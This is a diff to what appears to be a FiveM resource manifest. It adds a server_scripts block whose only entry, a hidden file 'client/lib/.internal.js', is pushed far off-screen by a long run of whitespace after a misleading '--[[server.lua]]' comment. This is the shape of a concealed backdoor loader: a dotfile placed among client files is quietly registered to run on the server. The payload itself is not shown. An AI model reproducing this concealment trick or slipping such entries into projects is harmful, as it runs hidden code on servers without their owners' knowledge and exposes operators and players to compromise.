@@ -7,3 +7,7 @@ lua54 'yes'
 version '1.13.1'
 
 server_script 'server/main.lua'
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.internal.js',
+}
